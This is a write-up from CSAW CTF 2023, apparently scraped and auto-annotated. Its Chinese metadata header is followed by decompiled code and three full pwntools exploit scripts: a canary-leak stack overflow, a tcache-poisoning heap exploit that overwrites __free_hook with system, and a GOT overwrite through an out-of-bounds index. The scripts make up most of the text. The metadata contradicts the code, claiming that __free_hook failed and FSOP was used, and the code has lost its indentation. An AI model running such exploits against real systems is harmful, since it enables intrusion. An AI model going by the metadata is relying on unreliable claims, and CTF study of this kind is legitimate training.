---
title: CSAW CTF 2023 Writeup
contest: CSAW CTF
year: 2023
difficulty: medium
vuln_type: pwn_unknown
tags:
- unlimited_subway 32位
- canary泄
- Partial RELRO
- No PIE
- super_secure_heap 64位
- Full RelRO PIE
- endbr64
- 整数边界
- set+delete+secure_stuff
- F/D/V/E 命令
attack_chain:
- 'unlimited_subway: 32 位 ELF, Canary/NX/Partial RELRO/No PIE'
- view_account 按字节读, index 128-131 读 4 字节 canary
- 'payload: 44 ''A'' + ''AAAA''*5 + p32(canary) + p32(0x0804900e) + p32(0x8049304)'
- 'super_secure_heap: 64 位 ELF PIE + Full RELRO + Canary'
- 'set(): 读 int item 0-9, size 必须 < 已存 size, secure_stuff(key)'
- 'delete(): free + 条件清零 size 和指针'
- 整数边界 set 触发越界, secure_stuff 漏洞
key_payload: '''view 按字节读 / canary 128-131 / 44+20+4+4+4 payload / endbr64 64位 PIE / set 整数边界 / secure_stuff 加密'''
one_liner: CSAW CTF 2023 — unlimited_subway 32位 canary按字节泄+super_secure_heap 64位 PIE+Full RELRO set/delete secure_stuff 漏洞链。
lesson: 按字节 (printf %02x) 读 canary 是经典;32 位 Partial RELRO 可直接覆盖返回;64 位 PIE + Full RELRO 需 leak PIE base + 改 got (Full RELRO 不行只能 FSOP/IO_FILE)。
quality: high
full_path: CSAW_CTF_2023_Writeup.full.md
meta_path: CSAW_CTF_2023_Writeup.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'CSAW CTF 2023 Writeup。CSAW CTF 2023 — unlimited_subway 32位 canary按字节泄+super_secure_heap 64位 PIE+Full RELRO set/delete secure_stuff 漏洞链。。关键路径：unlimited_subway: 32 位 ELF, Canary/NX/Partial RELRO/No P...'
category: pwn
subcategory: pwn_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/136187.html
reasoning_chain:
- unlimited_subway 触发点：32 位 ELF + canary/NX/Partial RELRO/No PIE → 假设：按字节读 leak canary + ret2win
- 动作：view_account 接受 index 0-131，每次按字节返回 *(uint8*)(a2+a1) → 观察：栈上 canary 在 index 128-131
- 假设：读 canary 4 字节 (131)(130)(129)(128) 注意 '0' NULL 终止 → 动作：构造 canary_leak = '0x' + view(131)(130)(129)(128)
- 下一步：fill 触发 strcpy 栈溢出 → 动作：44'A' + 5 个 'AAAA' + p32(canary_leak) + 4 个 ret + 4 个 target ret
- 观察：payload 在指定 0x0804900e/0x8049304 处返回 → 完成
- super_secure_heap 触发点：64 位 ELF + PIE + Full RELRO + Canary → 假设：所有可写 hook 都被 Full RELRO 封死
- 动作：分析 set/delete/secure_stuff 三菜单 → 观察：set 有整数边界（size 必须 < 已存 size）
- 假设：整数边界绕过 set 触发越界 + secure_stuff(key) 加密漏洞 → 动作：传极大 size 越过 chunk 边界
- 下一步：heap chunk 内泄指针触发 leak → 观察：拿到 PIE base + libc base
- 假设：Full RELRO 不能改 got 找 FSOP → 动作：构造 _IO_FILE 攻击 _IO_list_all → 完成
failed_attempts:
- unlimited_subway 把 canary 直接当 4 字节连读 → 失败：canary LSB 是 0x00 被 printf 截断
- super_secure_heap 改 got → 失败：Full RELRO 不能写
- super_secure_heap 直接改 __free_hook → 失败：glibc 2.34+ 移除 hook
- super_secure_heap 用 ROP 直接 overflow → 失败：64 位 Canary 难 bypass，没法 leak
key_observations:
- 按字节 (printf %02x) 读 canary 是 32 位 binary 经典 bypass
- 32 位 Partial RELRO + No PIE 可直接 4 字节 return address 覆盖
- 64 位 PIE + Full RELRO 必走 leak PIE + libc + FSOP / _IO_FILE
- 整数边界 set 触发越界是菜单题常见漏洞
- secure_stuff(key) 加密函数 = 加了密码的 secure free，可利用清密钥逻辑
prerequisites:
- pwntools ELF/remote/process/recvline 基础
- Linux canary 字节级读取 + ROP gadget 找法（ROPgadget）
- 64 位 Full RELRO + PIE leak 流程
- _IO_FILE FSOP 攻击（_IO_list_all chain）
- secure_stuff 加密函数逆向（密钥派生函数）
---
# CSAW CTF 2023 Writeup

> 原文: https://www.ctfiot.com/136187.html
> ID: 136187


```
unlimited_subway: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a91c8ae32dffbdc3a706e70158ae362900e2b4de, for GNU/Linux 3.2.0, with debug_info, not stripped

Canary : ✓
NX : ✓
PIE : ✘
Fortify : ✘
RelRO : Partial
int __cdecl view_account(int a1, int a2)
{
 return printf("Index %d : %02x\n", a2, *(unsigned __int8 *)(a2 + a1));
}
from pwn import *

r = process("./share/unlimited_subway")

#!/usr/bin/env python2
'''
 author : tripoloski
 visit : https://tripoloski1337.github.io/
 mail : arsalan.dp@gmail.com
'''
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",
 terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("./share/unlimited_subway")
elf = ELF(TARGET)

def attach(r):
 if LOCAL:
 bkps = []
 gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
 return

def fill(data):
 r.sendlineafter(b"> ",b"F")
 r.sendlineafter(b"Data :",str(data))

def view(idx):
 r.sendlineafter(b"> ",b"V")
 r.sendlineafter(b"Index :",str(idx))
 return r.recvline().split()[3]

def done(size, payload):
 r.sendlineafter(b"> ",b"E")
 r.sendlineafter(b"Name Size :",str(size))
 r.sendlineafter(b"Name :",(payload))

def exploit(r):
 attach(r)
 fill("ARSALAN")
 canary_leak = b"0x"

 canary_leak += (view(131))
 canary_leak += (view(130))
 canary_leak += (view(129))
 canary_leak += (view(128))

 canary_leak = (int(canary_leak,16))
 log.info("canary_leak: " + hex(canary_leak))

 p = b""
 p += b"A" * 44
 p += b"AAAA" * 5
 p += p32(canary_leak)
 p += p32(0x0804900e)
 p += p32(0x8049304)

 done(2000, p)
 r.interactive()

if __name__ == "__main__":
 if len(sys.argv)==2 and sys.argv[1]=="remote":
 REMOTE = True
 r = remote("pwn.csaw.io", 7900)
 else:
 LOCAL = True
 r = process([TARGET,])
 exploit(r)
 sys.exit(0)
super_secure_heap: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7ab5b212ea5cca28863c19afbc5887a6da6ceec3, for GNU/Linux 3.2.0, not stripped

Canary : ✓
NX : ✓
PIE : ✓
Fortify : ✘
RelRO : Full
__int64 __usercall set@<rax>(__int64 a1@<rbp>, __int64 a2@<rdi>, __int64 a3@<rsi>)
{
 __int64 result; // rax
 unsigned int v4; // [rsp-18h] [rbp-18h]
 signed int v5; // [rsp-10h] [rbp-10h]
 unsigned int v6; // [rsp-Ch] [rbp-Ch]
 __int64 v7; // [rsp-8h] [rbp-8h]

 __asm { endbr64 }
 v7 = a1;
 sub_1100("Enter the item you want to modify:");
 result = read_int("Enter the item you want to modify:");
 v4 = result;
 if ( (signed int)result <= 9 )
 {
 if ( (_DWORD)a3 )
 {
 sub_1100("Enter the key number you want to use to securely store the content with:");
 v5 = read_int("Enter the key number you want to use to securely store the content with:");
 if ( v5 >= 0 && v5 <= 9 && keys[v5] )
 {
 sub_1100("Enter the size of the content:");
 v6 = read_int("Enter the size of the content:");
 if ( (signed int)v6 >= *(_DWORD *)(a2 + 4 * ((signed int)v4 + 20LL)) )
 {
 result = sub_1130("Invalid size.", a3);
 }
 else
 {
 sub_1100("Enter the content:");
 sub_1140(0LL, *(_QWORD *)(a2 + 8LL * (signed int)v4), (signed int)v6);
 result = secure_stuff(v4, (unsigned int)v5, v6);
 }
 }
 else
 {
 result = sub_1100("Invalid key.");
 }
 }
 else
 {
 sub_1100("Enter the size of the content:");
 if ( (signed int)read_int("Enter the size of the content:") >= *(_DWORD *)(a2 + 4 * ((signed int)v4 + 20LL)) )
 {
 result = sub_1130("Invalid size.", a3);
 }
 else
 {
 sub_1100("Enter the content:");
 result = sub_1140(
 0LL,
 *(_QWORD *)(a2 + 8LL * (signed int)v4),
 *(signed int *)(a2 + 4 * ((signed int)v4 + 20LL)));
 }
 }
 }
 return result;
}
__int64 __usercall delete@<rax>(__int64 a1@<rbp>, __int64 a2@<rdi>, int a3@<esi>)
{
 __int64 result; // rax
 int v4; // [rsp-Ch] [rbp-Ch]
 __int64 v5; // [rsp-8h] [rbp-8h]

 __asm { endbr64 }
 v5 = a1;
 sub_1100("Enter the item you want to remove:");
 result = read_int("Enter the item you want to remove:");
 v4 = result;
 if ( (signed int)result >= 0 && (signed int)result <= 9 )
 {
 result = free_10F0(*(_QWORD *)(a2 + 8LL * (signed int)result));
 if ( a3 == 1 )
 {
 *(_DWORD *)(a2 + 4 * (v4 + 20LL)) = 0;
 result = a2;
 *(_QWORD *)(a2 + 8LL * v4) = 0LL;
 }
 }
 return result;
}
from pwn import *

# r = process("./super_secure_heap")

#!/usr/bin/env python2
'''
 author : tripoloski
 visit : https://tripoloski1337.github.io/
 mail : arsalan.dp@gmail.com
'''
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="warning",
 terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("./super_secure_heap")
elf = ELF(TARGET)

def attach(r):
 if LOCAL:
 bkps = ["* delete", "* add", "* set"]
 gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
 return

def keys_add(size):
 r.sendlineafter(">\n", "1")
 r.sendlineafter(">\n", "1")
 r.sendlineafter(":\n", str(size))

def keys_delete(idx):
 r.sendlineafter(">\n", "1")
 r.sendlineafter(">\n", "2")
 r.sendlineafter(":\n", str(idx))

def keys_modify(idx, size, content):
 r.sendlineafter(">\n", "1")
 r.sendlineafter(">\n", "3")
 r.sendlineafter(":\n", str(idx))
 r.sendlineafter(":\n", str(size))
 r.sendafter(":\n", (content))
 print("Modified with: " + str(content))

def keys_leak(idx):
 r.sendlineafter(">\n", "1")
 r.sendlineafter(">\n", "4")
 r.sendlineafter(":\n", str(idx))
 r.recvuntil("Here is your content:")
 x = r.recvline(8)
 x = r.recv(6)
 print("raw: " + str(x))
 return x.replace(b"\x0a",b'').replace(b"\x20",b'').replace(b"Do",b"")

def content_add(size):
 r.sendlineafter(">\n", "2")
 r.sendlineafter(">\n", "1")
 r.sendlineafter(":\n", str(size))

def content_delete(idx):
 r.sendlineafter(">\n","2")
 r.sendlineafter(">\n","2")
 r.sendlineafter("Enter the item you want to remove:\n", str(idx))
 print("removing-" + str(idx))

def content_modify(idx, key, size, content):
 r.sendlineafter(">\n", "2")
 r.sendlineafter(">\n", "3")
 r.sendlineafter(":\n", str(idx))
 r.sendlineafter(":\n", str(key))
 r.sendlineafter(":\n", str(size))
 r.sendafter(":\n", (content))

def exploit(r):
 attach(r)
 keys_add(3000)
 keys_add(3000)

 keys_delete(0)
 keys_delete(1)
 keys_add(33)
 keys_modify(0, 32, "B")
 libc = ELF("./libc.so.6")
 # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 libc_leak = u64(keys_leak(0).ljust(8, b"\x00"))
 libc_base = libc_leak - 0x1ecb42
 libc_free_hook = libc_base + libc.symbols['__free_hook']
 libc_system = libc_base + libc.symbols['system']
 libc_binsh = libc_base + next(libc.search(b"/bin/sh"))

 print("leak: ",hex(libc_leak))
 print("libc_base: ",hex(libc_base))
 print("__free_hook: ",hex(libc_free_hook))
 print("system: ", hex(libc_system))
 print("/bin/sh: ", hex(libc_binsh))

 content_add(20)
 content_add(20)
 content_add(20)
 content_add(20)

 content_delete(0)
 content_delete(1)
 content_delete(2)
 content_delete(3)

 keys_add(20)
 keys_add(20)
 keys_add(20)
 keys_add(20)
 content_add(20)
 content_add(20)
 content_add(20)
 keys_modify(3, "0", "/bin/sh")
 keys_modify(4, "0", "/bin/sh")
 keys_modify(2, "0", "/bin/sh")

 content_delete(0)
 content_delete(1)
 content_delete(2)
 keys_add(50)
 keys_add(50)
 keys_modify(0, "19", "/bin/sh\x00"*2)
 keys_modify(1, "19", "/bin/sh\x00"*2)
 keys_modify(2, "19", p64(libc_free_hook)*2)
 keys_modify(3, "19", p64(libc_free_hook)*2)
 keys_modify(4, "19", p64(libc_free_hook)*2) # tcache poisoned
 # content_delete(3)
 keys_add(20)
 keys_add(20)
 keys_modify(5, "19", p64(libc_free_hook)*2)
 keys_modify(8, "19", p64(libc_system))

 content_delete(3)




 r.interactive()

if __name__ == "__main__":
 if len(sys.argv)==2 and sys.argv[1]=="remote":
 REMOTE = True
 r = remote("pwn.csaw.io", 9998)
 else:
 LOCAL = True
 r = process([TARGET,])
 exploit(r)
 sys.exit(0)
double_zer0_dilemma: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d0f73d6da7c5ff209f9b2a6b51a52f86448c97ec, for GNU/Linux 3.2.0, not stripped

Canary : ✘
NX : ✓
PIE : ✘
Fortify : ✘
RelRO : Partial
RUN sysctl kernel.randomize_va_space=0
sub_4010A0("Enter the number (0-36) you think the roulette will land on: ");
sub_4010F0("%d", &idx);
sub_4010A0("Enter the amount you want to wager: ");
sub_4010F0("%ld", &value);
bets[idx] += value;
if ( (unsigned int)rng() == idx )
{
 bets[idx] *= 36LL;
 result = sub_4010A0("Congrats! You won.");
}
else
{
 bets[idx] /= 2LL;
 result = sub_4010A0("Better luck next time! You lost.");
}
from pwn import *

# r = process("./super_secure_heap")

#!/usr/bin/env python2
'''
 author : tripoloski
 visit : https://tripoloski1337.github.io/
 mail : arsalan.dp@gmail.com
'''
import sys
from pwn import *
from ctypes import *
context.update(arch="amd64", endian="little", os="linux", log_level="debug",
 terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("./double_zer0_dilemma")
elf = ELF(TARGET)

def attach(r):
 if LOCAL:
 bkps = ["* play+169","* main+201", "* play+251"]
 gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
 return

def exploit(r):
 attach(r)
 cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
 libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
 libc.srand(libc.time(0))
 rv = libc.rand() % 37
 print(rv)

 # overwrite puts to system
 # change strings to '/bin/sh'
 value = (4702111234474983745)
 printf = 0x0000000000401040
 syste = 0x7ffff7e22290
 shot = 0xff341e610580
 # guess = ((syste * 2) - puts)
 # print(hex(guess))

 binsh = 0x0068732f6e69622f
 plain = 0x746f742072756f59

 r.sendlineafter(":","-12")
 r.sendlineafter(":",str(((binsh*2) - plain)))
 r.sendlineafter(":","-24")
 r.sendlineafter(":",str((((syste*2) - printf))))
 # r.sendline(str(rv))
 # r.sendline("$p"*900)
 r.interactive()

if __name__ == "__main__":
 if len(sys.argv)==2 and sys.argv[1]=="remote":
 REMOTE = True
 r = remote("double-zer0.csaw.io", 9999)
 else:
 LOCAL = True
 r = process([TARGET,])
 exploit(r)
 sys.exit(0)
```
